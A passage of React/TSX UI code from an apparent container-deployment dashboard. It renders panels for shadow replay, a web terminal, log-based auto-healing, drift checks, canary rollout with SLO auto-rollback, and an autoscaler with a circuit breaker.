                    {mutationLines.map((m, idx) => <li key={idx}>{m}</li>)}
                  </ul>
                ) : (
                  <div className="font-mono text-[11px] text-slate-600">
                    0 pending mutations — live stack already matches checkpoint SHA-256.
                  </div>
                )}
              </div>
            );
          })()}
        </section>
      )}

      {activeCockpit === 'shadow' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <GitCompare className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.srTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.srDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={shadowLoading}
                onClick={() => void handleRunShadowReplay()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {shadowLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <GitCompare className="w-3.5 h-3.5" />}
                <span>{shadowLoading ? t('pd.srRunning') : t('pd.srRun')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Shadow Replay panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {shadowError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{shadowError}</div>}

          {shadowReport && (() => {
            const latRatio = shadowReport.summary.latencyRatioP95 ?? shadowReport.summary.latencyRatio;
            const driftCount = shadowReport.summary.breakingSchemaDriftCount ?? shadowReport.summary.schemaDriftCount ?? 0;
            return (
              <div className="space-y-3">
                <div className="flex flex-wrap items-center gap-2">
                  <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full font-mono font-semibold border ${
                    shadowReport.pass || shadowReport.verdict === 'PROMOTE'
                      ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                      : 'bg-red-50 text-red-700 border-red-200'
                  }`}>
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>{shadowReport.verdict}</span>
                  </span>
                  <span className="font-mono text-[11px] text-slate-500 tabular-nums">
                    {shadowReport.summary.totalRequests} requests replayed
                  </span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 tabular-nums">
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase text-slate-400 font-semibold block">p95 Latency Ratio</span>
                    <span className="font-mono text-sm font-semibold text-slate-900 block mt-0.5">
                      {latRatio != null ? `${latRatio.toFixed(2)}x` : '1.00x'}
                    </span>
                  </div>
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase text-slate-400 font-semibold block">5xx Delta</span>
                    <span className={`font-mono text-sm font-semibold block mt-0.5 ${(shadowReport.summary.delta5xx ?? 0) > 0 ? 'text-red-600' : 'text-emerald-700'}`}>
                      +{shadowReport.summary.delta5xx ?? 0}
                    </span>
                  </div>
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200">
                    <span className="text-[10px] uppercase text-slate-400 font-semibold block">JSON Schema Drift</span>
                    <span className={`font-mono text-sm font-semibold block mt-0.5 ${driftCount > 0 ? 'text-amber-700' : 'text-emerald-700'}`}>
                      {driftCount === 0 ? '0 drifts (clean)' : `${driftCount} drift(s)`}
                    </span>
                  </div>
                </div>
                {Array.isArray(shadowReport.blockers) && shadowReport.blockers.length > 0 && (
                  <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700 space-y-1">
                    {shadowReport.blockers.map((b, i) => (
                      <div key={i}>• {typeof b === 'string' ? b : (b.message || b.code || 'Cutover blocked')}</div>
                    ))}
                  </div>
                )}
              </div>
            );
          })()}
        </section>
      )}

      {activeCockpit === 'terminal' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-900 border border-slate-800 flex items-center justify-center text-emerald-400 shrink-0">
                <Terminal className="w-4 h-4" />
              </div>
              <div>
                <div className="flex items-center gap-2 flex-wrap">
                  <h2 className="text-sm font-semibold text-slate-900">{t('pd.termTitle')}</h2>
                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold border ${
                    termConnected
                      ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                      : 'bg-slate-100 text-slate-600 border-slate-200'
                  }`}>
                    {termConnected ? (isDemoMode() ? t('pd.termSandbox') : t('pd.termConnected')) : t('pd.termDisconnected')}
                  </span>
                </div>
                <p className="text-slate-500 mt-0.5">{t('pd.termDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 flex-wrap shrink-0">
              <select
                value={termShell}
                onChange={(e) => setTermShell(e.target.value as '/bin/sh' | '/bin/bash')}
                disabled={termConnected}
                aria-label="Container shell"
                className="px-2 py-1.5 rounded-lg border border-slate-200 bg-white font-mono text-slate-700"
              >
                <option value="/bin/sh">/bin/sh</option>
                <option value="/bin/bash">/bin/bash</option>
              </select>
              {termConnected ? (
                <button
                  type="button"
                  onClick={handleDisconnectTerminal}
                  className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-50 hover:bg-red-100 text-red-700 border border-red-200 font-medium cursor-pointer"
                >
                  <Square className="w-3 h-3" />
                  <span>{t('pd.termDisconnect')}</span>
                </button>
              ) : (
                <button
                  type="button"
                  disabled={termConnecting}
                  onClick={() => void handleConnectTerminal()}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {termConnecting ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Terminal className="w-3.5 h-3.5" />}
                  <span>{t('pd.termConnect')}</span>
                </button>
              )}
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Web Terminal panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {termError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{termError}</div>}

          <div
            className="rounded-xl border border-slate-800 overflow-hidden"
            style={{ backgroundColor: '#0b0e14', color: '#e2e8f0' }}
          >
            <div className="p-3.5 font-mono text-[11px] leading-relaxed h-52 overflow-y-auto space-y-0.5">
              {termLines.map((line, i) => (
                <div key={i} className="whitespace-pre-wrap break-all">
                  {line}
                </div>
              ))}
              <div ref={termEndRef} />
            </div>
            <form onSubmit={handleSendTerminalCmd} className="flex items-center gap-2 px-3 py-2 border-t border-slate-800 bg-slate-950/80">
              <span className="font-mono text-emerald-400 text-[11px] shrink-0">
                {project.name}#
              </span>
              <input
                type="text"
                value={termInput}
                onChange={(e) => setTermInput(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'ArrowUp' && termHistory.length > 0) {
                    e.preventDefault();
                    const nextIdx = Math.min(termHistory.length - 1, termHistoryIdx + 1);
                    setTermHistoryIdx(nextIdx);
                    setTermInput(termHistory[nextIdx] || '');
                  } else if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    const nextIdx = termHistoryIdx - 1;
                    setTermHistoryIdx(nextIdx);
                    setTermInput(nextIdx >= 0 ? (termHistory[nextIdx] || '') : '');
                  }
                }}
                placeholder={t('pd.termPlaceholder')}
                className="flex-1 min-w-0 bg-transparent text-slate-100 placeholder:text-slate-500 font-mono text-[11px] border-0 !shadow-none !outline-none"
              />
              <button
                type="submit"
                disabled={!termInput.trim()}
                className="inline-flex items-center gap-1 px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-100 text-[11px] font-medium cursor-pointer disabled:opacity-40 shrink-0"
              >
                <Send className="w-3 h-3" />
                <span>Run</span>
              </button>
            </form>
          </div>
        </section>
      )}

      {activeCockpit === 'healer' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <Wrench className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.healTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.healDesc')}</p>
              </div>
            </div>
            <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Auto-Healer panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer self-start">
              <X className="w-4 h-4" />
            </button>
          </div>

          <form onSubmit={(e) => void handleDiagnoseBuildLogs(e)} className="space-y-2.5">
            <label className="block">
              <span className="font-medium text-slate-700 block mb-1">{t('pd.healLogsLabel')}</span>
              <textarea
                rows={3}
                value={healLogs}
                onChange={(e) => setHealLogs(e.target.value)}
                className="w-full p-2.5 rounded-xl border border-slate-200 bg-white font-mono text-[11px] text-slate-900 leading-relaxed"
              />
            </label>
            <div className="flex items-center gap-2 flex-wrap">
              <button
                type="submit"
                disabled={healLoading || !healLogs.trim()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {healLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Wrench className="w-3.5 h-3.5" />}
                <span>{healLoading ? t('pd.healDiagnosing') : t('pd.healDiagnose')}</span>
              </button>
              {healDiagnosis?.matched && (
                <button
                  type="button"
                  disabled={healApplying}
                  onClick={() => void handleDryRunHeal()}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white hover:bg-slate-50 border border-slate-200 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  {healApplying ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600" />}
                  <span>{healApplying ? t('pd.healApplying') : t('pd.healDryRun')}</span>
                </button>
              )}
            </div>
          </form>

          {healError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{healError}</div>}

          {healDiagnosis && (
            !healDiagnosis.matched || !healDiagnosis.primary ? (
              <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 text-slate-600">{t('pd.healNoMatch')}</div>
            ) : (
              <div className="space-y-3">
                <div className="p-3.5 rounded-xl bg-slate-50 border border-slate-200 space-y-2">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className={`px-2 py-0.5 rounded-full font-mono text-[10px] font-semibold uppercase border ${
                      healDiagnosis.primary.severity === 'critical' || healDiagnosis.primary.severity === 'high'
                        ? 'bg-red-50 text-red-700 border-red-200'
                        : 'bg-amber-50 text-amber-800 border-amber-200'
                    }`}>
                      {healDiagnosis.primary.severity}
                    </span>
                    <span className="font-mono font-semibold text-slate-900">{healDiagnosis.primary.code}</span>
                    <span className="font-semibold text-slate-900">{healDiagnosis.primary.title}</span>
                    <span className="px-2 py-0.5 rounded-md bg-white border border-slate-200 font-mono text-[10px] text-emerald-700 tabular-nums ml-auto">
                      {Math.round(healDiagnosis.primary.confidence <= 1 ? healDiagnosis.primary.confidence * 100 : healDiagnosis.primary.confidence)}% confidence
                    </span>
                  </div>
                  <p className="text-slate-600 leading-relaxed">{healDiagnosis.primary.rootCause}</p>
                  {healDiagnosis.primary.patchPreview && (
                    <pre className="p-2.5 rounded-lg bg-slate-950 text-emerald-300 font-mono text-[11px] overflow-x-auto border border-slate-800">
                      {healDiagnosis.primary.patchPreview}
                    </pre>
                  )}
                  {healDiagnosis.matches.length > 1 && (
                    <div className="text-[11px] text-slate-500 font-mono">
                      +{healDiagnosis.matches.length - 1} secondary pattern(s): {healDiagnosis.matches.slice(1).map((m) => m.code).join(', ')}
                    </div>
                  )}
                </div>

                {healApplyResult && (() => {
                  const lines = Array.isArray(healApplyResult.mutationsSummary) && healApplyResult.mutationsSummary.length > 0
                    ? healApplyResult.mutationsSummary
                    : Array.isArray(healApplyResult.changes) && healApplyResult.changes.length > 0
                      ? healApplyResult.changes
                      : [
                          healApplyResult.patchPlan?.envAdditions
                            ? `Env additions: ${Object.entries(healApplyResult.patchPlan.envAdditions).map(([k, v]) => `${k}=${v}`).join(', ')}`
                            : null,
                          healApplyResult.patchPlan?.memoryLimitMb
                            ? `Set memoryLimitMb = ${healApplyResult.patchPlan.memoryLimitMb} MB`
                            : null,
                          healApplyResult.patchPlan?.logDriver
                            ? `Set logDriver = ${healApplyResult.patchPlan.logDriver}`
                            : null,
                          healApplyResult.patchPlan?.smartPackHint || healApplyResult.summary || null,
                        ].filter((x): x is string => Boolean(x));
                  return (
                    <div className="p-3 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-900 space-y-1">
                      <div className="font-semibold">{t('pd.healDryRunTitle')}</div>
                      {lines.length > 0 ? (
                        <ul className="list-disc list-inside text-[11px] space-y-0.5 font-mono">
                          {lines.map((l, i) => <li key={i}>{l}</li>)}
                        </ul>
                      ) : (
                        <div className="font-mono text-[11px]">Safe metadata patch ready for apply.</div>
                      )}
                    </div>
                  );
                })()}
              </div>
            )
          )}
        </section>
      )}

      {activeCockpit === 'drift' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-3.5 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <Activity className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.driftTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.driftDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={driftLoading}
                onClick={() => void handleRunDriftCheck()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {driftLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Activity className="w-3.5 h-3.5" />}
                <span>{driftLoading ? t('pd.driftRunning') : t('pd.driftRun')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Drift Check panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {driftError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{driftError}</div>}

          {driftReport && (() => {
            const diffs = Array.isArray(driftReport.diffs) ? driftReport.diffs : [];
            const actions = Array.isArray(driftReport.reconcilePlan?.actions) ? driftReport.reconcilePlan.actions : [];
            return (
              <div className="space-y-3">
                <div className="flex flex-wrap items-center gap-2">
                  <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full font-semibold border ${
                    driftReport.drifted
                      ? 'bg-amber-50 text-amber-800 border-amber-200'
                      : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                  }`}>
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>{driftReport.drifted ? t('pd.driftDrifted') : t('pd.driftInSync')}</span>
                  </span>
                  {driftReport.runtimeOffline && (
                    <span className="px-2 py-0.5 rounded-md bg-slate-100 border border-slate-200 font-mono text-[10px] text-slate-600">
                      Docker runtime offline
                    </span>
                  )}
                  {driftReport.declaredEnvKeyHash && (
                    <span className="px-2 py-0.5 rounded-md bg-slate-100 border border-slate-200 font-mono text-[10px] text-slate-600 tabular-nums">
                      envKeys:{String(driftReport.declaredEnvKeyHash).slice(0, 14)}
                    </span>
                  )}
                </div>

                {diffs.length > 0 ? (
                  <div className="divide-y divide-slate-100 border border-slate-200 rounded-xl overflow-hidden">
                    {diffs.map((d, idx) => (
                      <div key={idx} className="px-3.5 py-2.5 bg-white flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                        <div className="min-w-0">
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className={`px-1.5 py-0.5 rounded font-mono text-[10px] uppercase font-semibold border ${
                              d.severity === 'critical'
                                ? 'bg-red-50 text-red-700 border-red-200'
                                : 'bg-amber-50 text-amber-800 border-amber-200'
                            }`}>
                              {d.severity}
                            </span>
                            <span className="font-mono font-semibold text-slate-900">{d.field}</span>
                          </div>
                          {d.message && <p className="text-slate-600 mt-0.5">{d.message}</p>}
                        </div>
                        <div className="font-mono text-[11px] text-slate-500 shrink-0 tabular-nums">
                          {String(d.declared ?? '—')} → {String(d.actual ?? '—')}
                        </div>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 font-mono text-[11px] text-emerald-700">
                    0 drift diffs · live container matches declared Culkibo spec (image digest, RAM/CPU, ports, env key-set hash).
                  </div>
                )}

                {actions.length > 0 && (
                  <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 space-y-1">
                    <div className="font-semibold text-slate-900">Reconcile Plan (dryRun default)</div>
                    <ul className="list-disc list-inside text-[11px] font-mono text-slate-600 space-y-0.5">
                      {actions.map((a, idx) => (
                        <li key={idx}>{typeof a === 'string' ? a : (a.summary || a.action || a.field || 'Reconcile')}</li>
                      ))}
                    </ul>
                  </div>
                )}
              </div>
            );
          })()}
        </section>
      )}

      {/* Cycle-10 Cockpit Drawer: SLO Error-Budget Canary Auto-Rollback */}
      {activeCockpit === 'canary' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-4 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <Gauge className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.canaryTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.canaryDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 shrink-0">
              <button
                type="button"
                disabled={canaryBusy !== null}
                onClick={() => void handleStartCanary()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {canaryBusy === 'start' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
                <span>{canaryBusy === 'start' ? t('pd.canaryStarting') : t('pd.canaryStart')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close SLO Canary panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {canaryError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{canaryError}</div>}

          {(() => {
            const steps = Array.isArray(canaryRollout?.steps) && canaryRollout.steps.length > 0 ? canaryRollout.steps : [10, 25, 50, 100];
            const weight = canaryRollout?.canaryWeight ?? 0;
            const stableW = canaryRollout?.stableWeight ?? (100 - weight);
            const status = canaryRollout?.status || 'IDLE';
            const evals = Array.isArray(canaryRollout?.evaluations) ? canaryRollout.evaluations : [];
            const lastEvalBurn = evals.length > 0 ? evals[evals.length - 1]?.burn?.burnRate : undefined;
            const burnRate = canaryRollout?.lastBurnRate ?? lastEvalBurn ?? 0;
            const breachList = Array.isArray(canaryRollout?.breachReasons) ? canaryRollout.breachReasons : [];
            const isRolledBack = status === 'ROLLED_BACK' || status === 'ABORTED';
            return (
              <div className="space-y-3.5">
                {/* 10% -> 25% -> 50% -> 100% Caddy v2.11 Weighted Stepper */}
                <div className="grid grid-cols-4 gap-2 tabular-nums">
                  {steps.map((stepPct) => {
                    const reached = !isRolledBack && weight >= stepPct;
                    const isCurrent = status === 'IN_PROGRESS' && weight === stepPct;
                    return (
                      <div
                        key={stepPct}
                        className={`p-2.5 rounded-xl border text-center transition-colors ${
                          isRolledBack
                            ? 'bg-red-50 border-red-200 text-red-700'
                            : isCurrent
                              ? 'bg-slate-900 border-slate-900 text-white'
                              : reached
                                ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                                : 'bg-slate-50 border-slate-200 text-slate-500'
                        }`}
                      >
                        <div className="font-mono text-sm font-semibold">{stepPct}%</div>
                        <div className="text-[10px] opacity-80">
                          {stepPct === 100 ? 'Promoted' : `Stable ${100 - stepPct}%`}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Live Status, SRE Burn-Rate & Caddy Weights */}
                <div className="flex flex-wrap items-center justify-between gap-2 p-3 rounded-xl bg-slate-50 border border-slate-200 tabular-nums">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className={`px-2.5 py-0.5 rounded-full font-mono text-[10px] font-semibold border ${
                      isRolledBack
                        ? 'bg-red-50 text-red-700 border-red-200'
                        : status === 'PROMOTED'
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : status === 'IN_PROGRESS'
                            ? 'bg-amber-50 text-amber-800 border-amber-200'
                            : 'bg-white text-slate-600 border-slate-200'
                    }`}>
                      {isRolledBack ? `${status} · 100/0` : `${status} · ${stableW}/${weight}`}
                    </span>
                    <span className={`px-2 py-0.5 rounded-md font-mono text-[10px] border ${
                      burnRate > (canaryRollout?.maxBurnRate ?? 14.4)
                        ? 'bg-red-50 text-red-700 border-red-200 font-semibold'
                        : 'bg-white text-slate-700 border-slate-200'
                    }`}>
                      SRE Burn Rate: {Number(burnRate).toFixed(1)}x / {canaryRollout?.maxBurnRate ?? 14.4}x
                    </span>
                    <span className="font-mono text-[10px] text-slate-500">
                      Caddy weights: [{stableW}, {weight}]
                    </span>
                  </div>

                  {canaryRollout && status === 'IN_PROGRESS' && (
                    <div className="flex items-center gap-1.5 flex-wrap">
                      <button
                        type="button"
                        disabled={canaryBusy !== null}
                        onClick={() => void handleEvaluateCanary('advance')}
                        className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white font-medium cursor-pointer disabled:opacity-50"
                      >
                        {canaryBusy === 'advance' ? <Loader2 className="w-3 h-3 animate-spin" /> : <CheckCircle2 className="w-3 h-3" />}
                        <span>{t('pd.canaryAdvance')}</span>
                      </button>
                      <button
                        type="button"
                        disabled={canaryBusy !== null}
                        onClick={() => void handleEvaluateCanary('spike')}
                        className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium cursor-pointer disabled:opacity-50"
                      >
                        {canaryBusy === 'spike' ? <Loader2 className="w-3 h-3 animate-spin" /> : <ShieldAlert className="w-3 h-3" />}
                        <span>{t('pd.canarySpike')}</span>
                      </button>
                      <button
                        type="button"
                        disabled={canaryBusy !== null}
                        onClick={() => void handleAbortCanary()}
                        className="px-2.5 py-1 rounded-lg border border-slate-200 bg-white hover:bg-slate-100 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
                      >
                        {t('pd.canaryAbort')}
                      </button>
                    </div>
                  )}
                </div>

                {breachList.length > 0 && (
                  <div className="p-3 rounded-xl bg-red-50 border border-red-200 text-red-800 space-y-1">
                    <div className="font-semibold flex items-center gap-1.5">
                      <ShieldAlert className="w-4 h-4 shrink-0" />
                      <span>SLO Breach Auto-Rollback Executed (weights flipped instantly to 100 / 0)</span>
                    </div>
                    {breachList.map((reason, i) => {
                      const text = typeof reason === 'string'
                        ? reason
                        : (reason?.message || reason?.code || 'SLO threshold breached');
                      return (
                        <div key={i} className="font-mono text-[11px]">• {text}</div>
                      );
                    })}
                  </div>
                )}
              </div>
            );
          })()}
        </section>
      )}

      {/* Cycle-12 Cockpit Drawer: OOM-Safe KEDA Worker Autoscaler & 503 Backpressure Circuit Breaker */}
      {activeCockpit === 'autoscaler' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-4 text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                <Cpu className="w-4 h-4" />
              </div>
              <div>
                <h2 className="text-sm font-semibold text-slate-900">{t('pd.autoTitle')}</h2>
                <p className="text-slate-500 mt-0.5">{t('pd.autoDesc')}</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 flex-wrap shrink-0">
              <button
                type="button"
                disabled={autoBusy !== null}
                onClick={() => void handleSaveAutoscaler()}
                className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
              >
                <Save className="w-3.5 h-3.5" />
                <span>{autoBusy === 'save' ? t('pd.autoSaving') : t('pd.autoSave')}</span>
              </button>
              <button
                type="button"
                disabled={autoBusy !== null}
                onClick={() => void handleEvaluateAutoscaler(600, 384)}
                className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-red-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
              >
                <ShieldAlert className="w-3.5 h-3.5" />
                <span>{t('pd.autoTestBreaker')}</span>
              </button>
              <button
                type="button"
                disabled={autoBusy !== null}
                onClick={() => void handleEvaluateAutoscaler()}
                className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
              >
                {autoBusy === 'eval' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
                <span>{autoBusy === 'eval' ? t('pd.autoEvaluating') : t('pd.autoEval')}</span>
              </button>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Autoscaler panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {autoError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{autoError}</div>}

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 tabular-nums">
            <label className="block">
              <span className="text-[11px] font-medium text-slate-600 block mb-1">Max Replicas</span>
              <input
                type="number"
                min={1}
                max={32}
                value={autoPolicy.maxReplicas}
                onChange={(e) => setAutoPolicy((p) => ({ ...p, maxReplicas: Math.max(1, Number(e.target.value) || 1) }))}
                className="w-full px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white font-mono text-slate-900"
              />
            </label>
            <label className="block">
              <span className="text-[11px] font-medium text-slate-600 block mb-1">Scale-Up Queue</span>
              <input
                type="number"
                min={1}
                value={autoPolicy.scaleUpQueueThreshold}
                onChange={(e) => setAutoPolicy((p) => ({ ...p, scaleUpQueueThreshold: Math.max(1, Number(e.target.value) || 40) }))}
                className="w-full px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white font-mono text-slate-900"
              />
            </label>
            <label className="block">
              <span className="text-[11px] font-medium text-slate-600 block mb-1">Simulated Queue Depth</span>
              <input
                type="number"
                min={0}
                value={autoQueueDepth}
                onChange={(e) => setAutoQueueDepth(e.target.value)}
                className="w-full px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white font-mono text-slate-900"
              />
            </label>
            <label className="block">
              <span className="text-[11px] font-medium text-slate-600 block mb-1">Host Free RAM (MB)</span>
              <input
                type="number"
                min={128}
                value={autoHostFreeRam}
                onChange={(e) => setAutoHostFreeRam(e.target.value)}
                className="w-full px-2.5 py-1.5 rounded-lg border border-slate-200 bg-white font-mono text-slate-900"
              />
            </label>
          </div>

          {autoEval && (
            <div className={`p-3.5 rounded-xl border space-y-2 tabular-nums ${
              autoEval.circuitBreaker?.state === 'OPEN'
                ? 'bg-red-50 border-red-200 text-red-900'
                : 'bg-slate-50 border-slate-200 text-slate-900'
            }`}>
              <div className="flex flex-wrap items-center justify-between gap-2 font-mono">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold border ${
                    autoEval.circuitBreaker?.state === 'OPEN'
                      ? 'bg-red-100 text-red-800 border-red-300'
                      : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                  }`}>
                    {autoEval.action} · {autoEval.reason}
                  </span>
                  <span className="text-xs font-semibold">
                    Replicas: {autoEval.currentReplicas} → {autoEval.targetReplicas} (desired {autoEval.desiredReplicas}, maxSafeReplicas: {autoEval.maxSafeReplicas})
                  </span>
                </div>
                <span className="text-[11px] opacity-80">RAM headroom: {autoEval.memoryHeadroomMb} MB</span>
              </div>
              {autoEval.circuitBreaker?.state === 'OPEN' && (
                <div className="font-mono text-[11px] font-semibold text-red-800">
                  Circuit Breaker OPEN → HTTP {autoEval.circuitBreaker.httpStatus ?? 503} · Retry-After: {autoEval.circuitBreaker.retryAfterSec ?? 15}s (VPS protected from OOM!)
                </div>
              )}
            </div>
          )}
        </section>
      )}

